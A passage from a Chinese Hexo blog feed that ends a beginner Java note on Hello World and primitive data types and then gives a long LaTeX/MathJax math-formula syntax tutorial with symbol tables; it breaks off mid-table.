<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 第一个程序 </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[]args)</span></span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;万年不变的入门程序，Holle Word！&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class 第一个程序		//公开（public）的类(class)  类名&quot;第一个程序&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">public static void main(String[]args)	//公开、静态(static)、无返回值(void)的主函数  函数(方法) 名“main” 函数的参数是字符串类型的数组“args”</span></span><br><span class="line"><span class="comment">//主函数是程序的入口  必须要有主函数程序才能运行，主函数名固定为“main”</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">System.out.println		//标准输出语句，用于输出（打印）出字符串内容</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="八大数据类型"><a href="#八大数据类型" class="headerlink" title="八大数据类型"></a>八大数据类型</h3><p>计算机的运行离不开内存的存在，内存用来临时存放运行中的程序，当<code>程序被运行时会被加载到内存中</code>，等待被执行相关指令。程序向内存加载的过程需要内存准备相应的空间来存放程序，而<code>内存的空间是有限的，不能为了一个很小的程序就将内存分配都分配给它</code>，所有就需要给程序的限制内存占用大小，因此就产生了数据类型，<code>数据类型就是用来给程序的参数值规定范围大小的</code>，用不同的数据类型定义不同的参数值从而规范了程序的内存使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim 八大类型.java</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 八大类型 </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[]args)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">byte</span> by=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">		<span class="keyword">short</span> sh=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> in=s.nextInt();</span><br><span class="line">		<span class="keyword">long</span> lo=s.nextLong();</span><br><span class="line">		<span class="keyword">double</span> d=s.nextDouble();</span><br><span class="line">		<span class="keyword">float</span> fl=s.nextFloat();</span><br><span class="line">		String st=s.next();</span><br><span class="line">		<span class="keyword">boolean</span> bo=s.hasNext();</span><br><span class="line">		System.out.println(by+<span class="string">&quot;,&quot;</span>+sh+<span class="string">&quot;,&quot;</span>+in+<span class="string">&quot;,&quot;</span>+lo</span><br><span class="line">			+<span class="string">&quot;,&quot;</span>+d+<span class="string">&quot;,&quot;</span>+fl+<span class="string">&quot;,&quot;</span>+st+<span class="string">&quot;,&quot;</span>+bo);	<span class="comment">//将数据是输出</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>LaTex-Math（数学公式）语法</title>
    <url>/posts/ba88030/</url>
    <content><![CDATA[<p><a href="#keng1">坑点1</a> <a href="#keng2">坑点2</a></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>  LaTex是一种基于TeX的排版系统，利用这种编排系统的处理，能快快速的生成数学公式<br>  TeX在学术界特别是数学、物理学和计算机科学界十分流行,TeX被普遍认为是一个优秀的排版工具，尤其是对于复杂数学公式的处理</p>
<p>  LaTex能通过简单的字符快熟生成想要的公式，<a href="https://www.mathjax.org/">MathJax</a>和<a href="https://katex.org/">KaTeX</a>是出名的两个编排引擎，这两个引擎都用了LaTex的语法编排公式。MathJax对TeX字符的支持最全，但加载公式慢；KaTeX加载公式的速度快，但支持的TeX字符相对短缺。</p>
<p>  现在大部分Markdown编辑器都支持对LaTex(MathJax)的渲染，就如Markdown文档语法一样，通过简单的LaTex语法就能事项美观的数学公式</p>
<a id="more"></a>
<h1 id="LaTex-Math语法"><a href="#LaTex-Math语法" class="headerlink" title="LaTex Math语法"></a>LaTex Math语法</h1><p>在Markdown中插入公式的两种方式</p>
<ul>
<li><strong>行间插入</strong>:</li>
</ul>
<p><strong><font id="keng1" color="#FF0000">坑:Kramed的行间代码和行间公式不兼容,对行间插入的兼容性也不太好</font></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`$语句$`</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>独占行插入</strong> :</li>
</ul>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$$</span><br><span class="line">语句 </span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
<h2 id="字符修饰"><a href="#字符修饰" class="headerlink" title="字符修饰"></a>字符修饰</h2><h3 id="上、下标"><a href="#上、下标" class="headerlink" title="上、下标"></a>上、下标</h3><ul>
<li><code>^</code>     :上标</li>
<li><code>_</code>     :下标</li>
</ul>
<p><strong>可用<code>&#123;&#125;</code>将长字符放到上下标的位置</strong><br><strong><code>&#123;&#125;</code>内不加字符能代表空白处，<font color="#FF0000">对其进行操作可起到在字符左边进行操作的目的</font></strong></p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">$x_1$</span><br><span class="line"></span><br><span class="line">$x_1^2$</span><br><span class="line"></span><br><span class="line">$x^2_1$</span><br><span class="line"></span><br><span class="line">$x_&#123;22&#125;^&#123;(n)&#125;$</span><br><span class="line"></span><br><span class="line">$x_&#123;balabala&#125;^&#123;bala&#125;$</span><br><span class="line"></span><br><span class="line">$$</span><br><span class="line">^*x^*</span><br><span class="line">$$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000">**效果:**</font>


<p>$x_1$</p>
<p>$x_1^2$</p>
<p>$x^2_1$</p>
<p>$x_{22}^{(n)}$</p>
<p>$x_{balabala}^{bala}$</p>
<p><strong>Kramed渲染引擎对一些行间插入不兼容</strong></p>
<script type="math/tex; mode=display">
^*x^*</script><hr>
<h3 id="矢量"><a href="#矢量" class="headerlink" title="矢量"></a>矢量</h3><ul>
<li><code>\vec X</code>                 <font color="#FF0000"><strong>效果:</strong></font> $\vec X$</li>
<li><code>overrightarrow&#123;xy&#125;</code>     <font color="#FF0000"><strong>效果:</strong></font> $\overrightarrow{xy}$</li>
</ul>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><p>对公式的某一部分字符进行字体转换，可以用 <code>&#123;\字体 &#123;需转换的部分字符&#125;&#125;</code> 命令,默认为意大利体(数学斜体)，<font color="#FF0000"><strong>防止<code>\</code>后的内容不被一些渲染器给转义了，需要用行代码块将其包围</strong></font></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">说明</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>\rm</code></td>
<td style="text-align:center">罗马体</td>
<td style="text-align:center">$\rm{Eonun}$</td>
<td style="text-align:center"><code>\cal</code></td>
<td style="text-align:center">花体</td>
<td style="text-align:center">$\cal {Eonun}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\it</code></td>
<td style="text-align:center">意大利体</td>
<td style="text-align:center">$\it{Eonun}$</td>
<td style="text-align:center"><code>\Bbb</code></td>
<td style="text-align:center">黑板粗体</td>
<td style="text-align:center">$\Bbb{Eonun}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\bf</code></td>
<td style="text-align:center">粗体</td>
<td style="text-align:center">$\bf{Eonun}$</td>
<td style="text-align:center"><code>\mit</code></td>
<td style="text-align:center">数学斜体</td>
<td style="text-align:center">$\mit{Eonun}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\sf</code></td>
<td style="text-align:center">等线体</td>
<td style="text-align:center">$\sf{Eonun}$</td>
<td style="text-align:center"><code>\scr</code></td>
<td style="text-align:center">手写体</td>
<td style="text-align:center">$\scr{Eonun}$</td>
</tr>
<tr>
<td style="text-align:center"><code>\tt</code></td>
<td style="text-align:center">打字机体</td>
<td style="text-align:center">$\tt{Eonun}$</td>
<td style="text-align:center"><code>\frak</code></td>
<td style="text-align:center">旧德式字体</td>
<td style="text-align:center">$\frak{Eonun}$</td>
</tr>
</tbody>
</table>
</div>
<h3 id="文字颜色"><a href="#文字颜色" class="headerlink" title="文字颜色"></a>文字颜色</h3><p>使用 <code>\color&#123;颜色&#125;&#123;文字&#125;</code> 来更改特定的文字颜色</p>
<p>常用颜色：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">颜色</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">颜色</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">silver</td>
<td style="text-align:center">$\color{silver}{eonun}$</td>
<td style="text-align:center">white</td>
<td style="text-align:center">$\color{white}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">black</td>
<td style="text-align:center">$\color{black}{eonun}$</td>
<td style="text-align:center">grey</td>
<td style="text-align:center">$\color{grey}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">maroon</td>
<td style="text-align:center">$\color{maroon}{eonun}$</td>
<td style="text-align:center">red</td>
<td style="text-align:center">$\color{red}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">yellow</td>
<td style="text-align:center">$\color{yellow}{eonun}$</td>
<td style="text-align:center">lime</td>
<td style="text-align:center">$\color{lime}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">olive</td>
<td style="text-align:center">$\color{olive}{eonun}$</td>
<td style="text-align:center">green</td>
<td style="text-align:center">$\color{green}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">teal</td>
<td style="text-align:center">$\color{teal}{eonun}$</td>
<td style="text-align:center">auqa</td>
<td style="text-align:center">$\color{auqa}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">blue</td>
<td style="text-align:center">$\color{blue}{eonun}$</td>
<td style="text-align:center">navy</td>
<td style="text-align:center">$\color{navy}{eonun}$</td>
</tr>
<tr>
<td style="text-align:center">purple</td>
<td style="text-align:center">$\color{purple}{eonun}$</td>
<td style="text-align:center">fuchsia</td>
<td style="text-align:center">$\color{fuchsia}{eonun}$</td>
</tr>
</tbody>
</table>
</div>
<p>其他色：</p>
<p>输入 <code>\color &#123; #rgb&#125; &#123;text&#125;</code> 来自定义更多的颜色，其中 <code>#rgb</code> 表示红色、绿色和蓝色的纯度（饱和度）</p>
<p><strong><font id="keng2" color="#FF0000">坑: <code>hexo</code>的博文中使用<code>&#123; #</code>（中间没空格）会解析冲突导致报错</font></strong>,使用<code>`用和`</code>将其包裹能解决</p>
<p><a href="http://tool.oschina.net/commons?type=3">RGB颜色表</a></p>
<h3 id="界定符"><a href="#界定符" class="headerlink" title="界定符"></a>界定符</h3><ul>
<li>小括号: <code>()</code>                     <font color="#FF0000"><strong>效果:</strong></font> $()$</li>
<li>中括号: <code>[]</code>                     <font color="#FF0000"><strong>效果:</strong></font> $[]$</li>
<li>尖括号: <code>\langle</code>、<code>\rangle</code>     <font color="#FF0000"><strong>效果:</strong></font> $\langle$  、 $\rangle$</li>
<li>大括号: <code>\&#123;\&#125;</code>                 <font color="#FF0000"><strong>效果:</strong></font> ${}$</li>
<li><p>竖线: </p>
<ul>
<li><code>|</code>                         <font color="#FF0000"><strong>效果:</strong></font>  $|$</li>
<li><code>\lvert值\rvert</code>             <strong>效果:</strong> $\lvert值\rvert$</li>
<li><code>\lVert值\rVert</code>             <strong>效果:</strong> $\lVert值\rVert$</li>
<li><code>\|</code> (双竖线)                 <strong>效果:</strong> $|$</li>
</ul>
</li>
<li><p>省略号: </p>
<ul>
<li><code>\dots</code>     :横省略号,偏下</li>
<li><code>\cdots</code>     :横省略号,偏上 </li>
<li><code>\vdots</code>     :竖省略号 </li>
<li><code>\ddots</code>     :斜省略号</li>
</ul>
<p><font color="#FF0000"> <strong>效果:</strong> </font>  $\dots$ , $\cdots$ , $\vdots$ , $\ddots$</p>
<p><code>\dots</code> 和 <code>\cdots</code> 的纵向位置不同，<strong>前者一般用于有下标的序列</strong></p>
</li>
</ul>
<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>  LaTex语法会忽略空格，需用<code>\</code>转义空格</p>
<ul>
<li><code>\,</code> (小空格)             <code>a\,b</code>     <strong>效果:</strong> $a\,b$</li>
<li><code>\</code> (大空格)     <code>a\ b</code> <font color="#FF0000"><strong>效果:</strong></font> $a\ b$</li>
<li><code>\quad</code> (四个空格)         <code>a\quad b</code>     <font color="#FF0000"><strong>效果:</strong></font> $a\quad b$</li>
<li><p><code>\qquad</code> (八个空格)     <code>a\qquad b</code> <font color="#FF0000"><strong>效果:</strong></font> $a\qquad b$</p>
<ul>
<li>减距离: <code>\!</code>             <code>a\!b</code>         <font color="#FF0000"><strong>效果:</strong></font> $a!b$      对比 $ab$</li>
</ul>
</li>
</ul>
<h3 id="大小控制"><a href="#大小控制" class="headerlink" title="大小控制"></a>大小控制</h3><ul>
<li>自适应: <code>\left自适应语\right句</code><ul>
<li><code>(\frac&#123;x&#125;&#123;y&#125;)</code>             <font color="#FF0000"><strong>效果:</strong></font> $(\frac{x}{y})$</li>
<li><code>\left(\frac&#123;x&#125;&#123;y&#125;\right)</code>     <font color="#FF0000"><strong>效果:</strong></font> $\left(\frac{x}{y}\right)$</li>
<li><code>\left[\frac&#123;x&#125;&#123;y&#125;\right]</code>     <font color="#FF0000"><strong>效果:</strong></font> $\left[\frac{x}{y}\right]$</li>
<li><code>\left[(\frac&#123;x&#125;&#123;y&#125;\right)]</code> <font color="#FF0000"><strong>效果:</strong></font> $\left[(\frac{x}{y}\right)]$</li>
</ul>
</li>
</ul>
<ul>
<li><p>指定大小: <code>big``Big``bigg``Bigg</code></p>
<p>可在后面加上<strong><code>l</code>的是左边，<code>r</code>的是右边，<code>big</code>等变为<code>bigl</code>代表左边的，变为<code>bigr</code>代表右边的，便于区分是那边的</strong></p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$\Bigg(\bigg(\Big(\big((x)\big)\Big)\bigg)\Bigg)$$</span><br><span class="line"></span><br><span class="line">加&#96;l&#96;和&#96;r&#96;</span><br><span class="line">$$\Biggl(\biggl(\Bigl(\bigl((x)\bigr)\Bigr)\biggr)\Biggr)$$</span><br><span class="line"> </span><br><span class="line">$$\Biggl[\biggl[\Bigl[\bigl[[x]\bigr]\Bigr]\biggr]\Biggr]$$</span><br><span class="line"></span><br><span class="line">$$\Biggl \&#123;\biggl \&#123;\Bigl \&#123;\bigl \&#123;\&#123;x\&#125;\bigr \&#125;\Bigr \&#125;\biggr \&#125;\Biggr\&#125;$$</span><br><span class="line"></span><br><span class="line">$$\Biggl\langle\biggl\langle\Bigl\langle\bigl\langle\langle x</span><br><span class="line">\rangle\bigr\rangle\Bigr\rangle\biggr\rangle\Biggr\rangle$$</span><br><span class="line"></span><br><span class="line">$$\Biggl\lvert\biggl\lvert\Bigl\lvert\bigl\lvert\lvert x</span><br><span class="line">\rvert\bigr\rvert\Bigr\rvert\biggr\rvert\Biggr\rvert$$</span><br><span class="line"></span><br><span class="line">$$\Biggl\lVert\biggl\lVert\Bigl\lVert\bigl\lVert\lVert x</span><br><span class="line">\rVert\bigr\rVert\Bigr\rVert\biggr\rVert\Biggr\rVert$$</span><br><span class="line"></span><br><span class="line">$$\Biggl|\biggl|\Bigl|\bigl||x|\bigr|\Bigr|\biggr|\Biggr|$$</span><br><span class="line"></span><br><span class="line">$$\Bigg\|\bigg\|\Big\|\big\|\|$$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<font color="#FF0000"> **效果:** </font>

<script type="math/tex; mode=display">\Bigg(\bigg(\Big(\big((x)\big)\Big)\bigg)\Bigg)</script><p>加<code>l</code>和<code>r</code></p>
<script type="math/tex; mode=display">\Biggl(\biggl(\Bigl(\bigl((x)\bigr)\Bigr)\biggr)\Biggr)</script><script type="math/tex; mode=display">\Biggl[\biggl[\Bigl[\bigl[[x]\bigr]\Bigr]\biggr]\Biggr]</script><script type="math/tex; mode=display">\Biggl \{\biggl \{\Bigl \{\bigl \{\{x\}\bigr \}\Bigr \}\biggr \}\Biggr\}</script><script type="math/tex; mode=display">\Biggl\langle\biggl\langle\Bigl\langle\bigl\langle\langle x
\rangle\bigr\rangle\Bigr\rangle\biggr\rangle\Biggr\rangle</script><script type="math/tex; mode=display">\Biggl\lvert\biggl\lvert\Bigl\lvert\bigl\lvert\lvert x
\rvert\bigr\rvert\Bigr\rvert\biggr\rvert\Biggr\rvert</script><script type="math/tex; mode=display">\Biggl\lVert\biggl\lVert\Bigl\lVert\bigl\lVert\lVert x
\rVert\bigr\rVert\Bigr\rVert\biggr\rVert\Biggr\rVert</script><script type="math/tex; mode=display">\Biggl|\biggl|\Bigl|\bigl||x|\bigr|\Bigr|\biggr|\Biggr|</script><script type="math/tex; mode=display">\Bigg\|\bigg\|\Big\|\big\|\|</script><hr>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>\mid</code></td>
<td style="text-align:center">$\mid$</td>
<td style="text-align:center"><code>\nmid</code></td>
<td style="text-align:center">$\nmid$</td>
</tr>
<tr>
<td style="text-align:center"><code>\cdot</code></td>
<td style="text-align:center">$\cdot$</td>
<td style="text-align:center"><code>\leq</code></td>
<td style="text-align:center">$\leq$</td>
</tr>
<tr>
<td style="text-align:center"><code>\geq</code></td>
<td style="text-align:center">$\geq$</td>
<td style="text-align:center"><code>\neq</code></td>
<td style="text-align:center">$\neq$</td>
</tr>
<tr>
<td style="text-align:center"><code>\approx</code></td>
<td style="text-align:center">$\approx$</td>
<td style="text-align:center"><code>\equiv</code></td>
<td style="text-align:center">$\equiv$</td>
</tr>
<tr>
<td style="text-align:center"><code>\prec</code></td>
<td style="text-align:center">$\prec$</td>
<td style="text-align:center"><code>\preceq</code></td>
<td style="text-align:center">$\preceq$</td>
</tr>
<tr>
<td style="text-align:center"><code>\ll</code></td>
<td style="text-align:center">$\ll$</td>
<td style="text-align:center"><code>\succ</code></td>
<td style="text-align:center">$\succ$</td>
</tr>
<tr>
<td style="text-align:center"><code>\succeq</code></td>
<td style="text-align:center">$\succeq$</td>
<td style="text-align:center"><code>\gg</code></td>
<td style="text-align:center">$\gg$</td>
</tr>
<tr>
<td style="text-align:center"><code>\sim</code></td>
<td style="text-align:center">$\sim$</td>
<td style="text-align:center"><code>\simeq</code></td>
<td style="text-align:center">$\simeq$</td>
</tr>
<tr>
<td style="text-align:center"><code>\asymp</code></td>
<td style="text-align:center">$\asymp$</td>
<td style="text-align:center"><code>\cong</code></td>
<td style="text-align:center">$\cong$</td>
</tr>
<tr>
<td style="text-align:center"><code>\doteq</code></td>
<td style="text-align:center">$\doteq$</td>
<td style="text-align:center"><code>\propto</code></td>
<td style="text-align:center">$\propto$</td>
</tr>
<tr>
<td style="text-align:center"><code>\models</code></td>
<td style="text-align:center">$\models$</td>
<td style="text-align:center"><code>\parallel</code></td>
<td style="text-align:center">$\parallel$</td>
</tr>
<tr>
<td style="text-align:center"><code>\bowtie</code></td>
<td style="text-align:center">$\bowtie$</td>
<td style="text-align:center"><code>\perp</code></td>
<td style="text-align:center">$\perp$</td>
</tr>
<tr>
<td style="text-align:center"><code>\circ</code></td>
<td style="text-align:center">$\circ$</td>
<td style="text-align:center"><code>\ast</code></td>
<td style="text-align:center">$\ast$</td>
</tr>
<tr>
<td style="text-align:center"><code>\bigodot</code></td>
<td style="text-align:center">$\bigodot$</td>
<td style="text-align:center"><code>\bigotimes</code></td>
<td style="text-align:center">$\bigotimes$</td>
</tr>
<tr>
<td style="text-align:center"><code>\bigoplus</code></td>
<td style="text-align:center">$\bigoplus$</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">显输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>\pm</code></td>
<td style="text-align:center">$\pm$</td>
<td style="text-align:center"><code>\mp</code></td>
<td style="text-align:center">$\mp$</td>
</tr>
<tr>
<td style="text-align:center"><code>\times</code></td>
<td style="text-align:center">$\times$</td>
<td style="text-align:center"><code>\ast</code></td>
<td style="text-align:center">$\ast$</td>
</tr>
<tr>
<td style="text-align:center"><code>\star</code></td>
<td style="text-align:center">$\star$</td>
<td style="text-align:center"><code>\circ</code></td>
<td style="text-align:center">$\circ$</td>
</tr>
<tr>
<td style="text-align:center"><code>\bullet</code></td>
<td style="text-align:center">$\bullet$</td>
<td style="text-align:center"><code>\cdot</code></td>
<td style="text-align:center">$\cdot$</td>
</tr>
<tr>
<td style="text-align:center"><code>\div</code></td>
<td style="text-align:center">$\div$</td>
<td style="text-align:center"><code>\sum</code></td>
<td style="text-align:center">$\sum$</td>
</tr>
<tr>
<td style="text-align:center"><code>\prod</code></td>
<td style="text-align:center">$\prod$</td>
<td style="text-align:center"><code>\coprod</code></td>
<td style="text-align:center">$\coprod$</td>
</tr>
<tr>
<td style="text-align:center"><code>\oplus</code></td>
<td style="text-align:center">$\oplus$</td>
<td style="text-align:center"><code>\bigoplus</code></td>
<td style="text-align:center">$\bigoplus$</td>
</tr>
<tr>
<td style="text-align:center"><code>\ominus</code></td>
<td style="text-align:center">$\ominus$</td>
<td style="text-align:center"><code>\otimes</code></td>
<td style="text-align:center">$\otimes$</td>
</tr>
<tr>
<td style="text-align:center"><code>\bigotimes</code></td>
<td style="text-align:center">$\bigotimes$</td>
<td style="text-align:center"><code>\oslash</code></td>
<td style="text-align:center">$\oslash$</td>
</tr>
<tr>
<td style="text-align:center"><code>\odot</code></td>
<td style="text-align:center">$\odot$</td>
<td style="text-align:center"><code>\bigodot</code></td>
<td style="text-align:center">$\bigodot$</td>
</tr>
<tr>
<td style="text-align:center"><code>\diamond</code></td>
<td style="text-align:center">$\diamond$</td>
<td style="text-align:center"><code>\bigtriangleup</code></td>
<td style="text-align:center">$\bigtriangleup$</td>
</tr>
<tr>
<td style="text-align:center"><code>\bigtriangledown</code></td>
<td style="text-align:center">$\bigtriangledown$</td>
<td style="text-align:center"><code>\triangleleft</code></td>
<td style="text-align:center">$\triangleleft$</td>
</tr>
<tr>
<td style="text-align:center"><code>\triangleright</code></td>
<td style="text-align:center">$\triangleright$</td>
<td style="text-align:center"><code>\triangleright</code></td>
<td style="text-align:center">$\triangleright$</td>
</tr>
<tr>
<td style="text-align:center"><code>\bigcirc</code></td>
<td style="text-align:center">$\bigcirc$</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>\emptyset</code></td>
<td style="text-align:center">$\emptyset$</td>
<td style="text-align:center"><code>\in</code></td>
<td style="text-align:center">$\in$</td>
<td style="text-align:center"><code>\notin</code></td>
<td style="text-align:center">$\notin$</td>
</tr>
<tr>
<td style="text-align:center"><code>\subset</code></td>
<td style="text-align:center">$\subset$</td>
<td style="text-align:center"><code>\supset</code></td>
<td style="text-align:center">$\supset$</td>
<td style="text-align:center"><code>\subseteq</code></td>
<td style="text-align:center">$\subseteq$</td>
</tr>
<tr>
<td style="text-align:center"><code>\supseteq</code></td>
<td style="text-align:center">$\supseteq$</td>
<td style="text-align:center"><code>\bigcap</code></td>
<td style="text-align:center">$\bigcap$</td>
<td style="text-align:center"><code>\bigcup</code></td>
<td style="text-align:center">$\bigcup$</td>
</tr>
<tr>
<td style="text-align:center"><code>\bigvee</code></td>
<td style="text-align:center">$\bigvee$</td>
<td style="text-align:center"><code>\bigwedge</code></td>
<td style="text-align:center">$\bigwedge$</td>
<td style="text-align:center"><code>\biguplus</code></td>
<td style="text-align:center">$\biguplus$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="对数"><a href="#对数" class="headerlink" title="对数"></a>对数</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>\log</code></td>
<td style="text-align:center">$\log$</td>
<td style="text-align:center"><code>\lg</code></td>
<td style="text-align:center">$\lg$</td>
<td style="text-align:center"><code>\ln</code></td>
<td style="text-align:center">$\ln$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="三角"><a href="#三角" class="headerlink" title="三角"></a>三角</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>30^\circ</code></td>
<td style="text-align:center">$30^\circ$</td>
<td style="text-align:center"><code>\bot</code></td>
<td style="text-align:center">$\bot$</td>
<td style="text-align:center"><code>\angle A</code></td>
<td style="text-align:center">$\angle A$</td>
</tr>
<tr>
<td style="text-align:center"><code>\sin</code></td>
<td style="text-align:center">$\sin$</td>
<td style="text-align:center"><code>\cos</code></td>
<td style="text-align:center">$\cos$</td>
<td style="text-align:center"><code>\tan</code></td>
<td style="text-align:center">$\tan$</td>
</tr>
<tr>
<td style="text-align:center"><code>\csc</code></td>
<td style="text-align:center">$\csc$</td>
<td style="text-align:center"><code>\sec</code></td>
<td style="text-align:center">$\sec$</td>
<td style="text-align:center"><code>\cot</code></td>
<td style="text-align:center">$\cot$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="微积分"><a href="#微积分" class="headerlink" title="微积分"></a>微积分</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>\int</code></td>
<td style="text-align:center">$\int$</td>
<td style="text-align:center"><code>\iint</code></td>
<td style="text-align:center">$\iint$</td>
<td style="text-align:center"><code>\iiint</code></td>
<td style="text-align:center">$\iiint$</td>
</tr>
<tr>
<td style="text-align:center"><code>\iiiint</code></td>
<td style="text-align:center">$\iiiint$</td>
<td style="text-align:center"><code>\oint</code></td>
<td style="text-align:center">$\oint$</td>
<td style="text-align:center"><code>\prime</code></td>
<td style="text-align:center">$\prime$</td>
</tr>
<tr>
<td style="text-align:center"><code>\lim</code></td>
<td style="text-align:center">$\lim$</td>
<td style="text-align:center"><code>\infty</code></td>
<td style="text-align:center">$\infty$</td>
<td style="text-align:center"><code>\nabla</code></td>
<td style="text-align:center">$\nabla$</td>
</tr>
</tbody>
</table>
</div>
<h4 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>\forall</code></td>
<td style="text-align:center">$\forall$</td>
<td style="text-align:center"><code>\exists</code></td>
<td style="text-align:center">$\exists$</td>
<td style="text-align:center"><code>\not\subset</code></td>
<td style="text-align:center">$\not\subset$</td>
</tr>
<tr>
<td style="text-align:center"><code>\not&lt;</code></td>
<td style="text-align:center">$\not&lt;$</td>
<td style="text-align:center"><code>\not&gt;</code></td>
<td style="text-align:center">$\not&gt;$</td>
<td style="text-align:center"><code>\not=</code></td>
<td style="text-align:center">$\not=$</td>
</tr>
<tr>
<td style="text-align:center"><code>\because</code></td>
<td style="text-align:center">$\because$</td>
<td style="text-align:center"><code>\therefore</code></td>
<td style="text-align:center">$\therefore$</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<h4 id="字符帽"><a href="#字符帽" class="headerlink" title="字符帽"></a>字符帽</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">显示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>\hat&#123;xy&#125;</code></td>
<td style="text-align:center">$\hat{xy}$</td>
<td style="text-align:center"><code>\widehat&#123;xyz&#125;</code></td>
<td style="text-align:center">$\widehat{xyz}$</td>
